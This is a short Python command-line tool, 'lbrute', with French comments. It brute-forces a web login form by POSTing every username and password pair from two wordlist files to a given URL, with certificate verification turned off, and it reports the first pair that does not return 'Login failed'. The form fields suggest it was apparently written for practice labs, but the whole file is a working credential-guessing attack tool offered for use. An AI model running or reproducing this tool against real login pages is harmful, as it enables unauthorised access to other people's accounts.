#!/usr/bin/env python3

import pyfiglet
from colorama import Fore
import requests
from argparse import ArgumentParser
import sys
import os

# Définition de l'auteur
author = '@Ber1y'

# Création de l'art ASCII "LBRUTE" avec PyFiglet
text = pyfiglet.figlet_format("lbrute".upper())

# Analyse des arguments en ligne de commande
parser = ArgumentParser()
parser.add_argument('-u', '--url', help="The URL of the login page", type=str, required=True)
parser.add_argument('-n', '--userlist', help="The usernames file", type=str, required=True)
parser.add_argument('-w', '--wordlist', help="The password wordlist file", type=str, required=True)
parser.add_argument('-v', '--verbose', help="Show more information about the attack", action='store_true')
args = parser.parse_args()

# Obtention du chemin absolu des fichiers d'utilisateurs et de mots de passe
args.userlist = os.path.abspath(args.userlist)
args.wordlist = os.path.abspath(args.wordlist)

# Affichage de l'en-tête avec des informations sur l'application
print(f"""{Fore.GREEN}
{text}
{Fore.WHITE}
Created by {author}
{'--' * 40}
{Fore.WHITE}
This is a very basic brute-forcing tool.
:: URL         : {args.url}
:: Usernames   : {args.userlist}
:: Passwords   : {args.wordlist}
{'--' * 40}
""")

# Définition de la fonction de force brute
def bruteforce(url, userlist, wordlist):
    try:
        # Lecture du fichier d'utilisateurs
        with open(userlist, 'r', encoding='latin-1') as users_file:
            for user in users_file:
                user = user.strip()
                # Lecture du fichier de mots de passe
                for password in open(wordlist, 'r', encoding='latin-1'):
                    password = password.strip()
                    data = {"username": user, "password": password, "Login": "Login"}
                    try:
                        # Envoi de la requête POST pour tester les identifiants
                        r = requests.post(url, data=data, verify=False)  # Désactivation de la validation du certificat SSL pour les tests.
                        if "Login failed" in r.text:
                            if args.verbose:
                                print(f"{Fore.RED}[-] {Fore.WHITE}Credentials failed: {user}:{password}")
                        else:
                            # Affichage des identifiants trouvés
                            return (user, password)
                    except Exception as e:
                        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")
                if not args.verbose:
                    print("Working...")
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

# Exécution de la fonction de force brute
try:
    credentials = bruteforce(args.url, args.userlist, args.wordlist)
    if credentials:
        # Affichage des identifiants trouvés
        print(f"{Fore.BLUE}[+] Credentials found: {credentials[0]}:{credentials[1]}")
    else:
        # Aucun identifiant trouvé
        print(f"{Fore.RED}[-] Credentials Not found. Try using a different wordlist or username list.")
except KeyboardInterrupt:
    # Sortie en cas d'interruption clavier (Ctrl+c)
    print(f"{Fore.BLUE}[-] {Fore.WHITE}Exit.")
except Exception as e:
    # Gestion des erreurs
    print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")
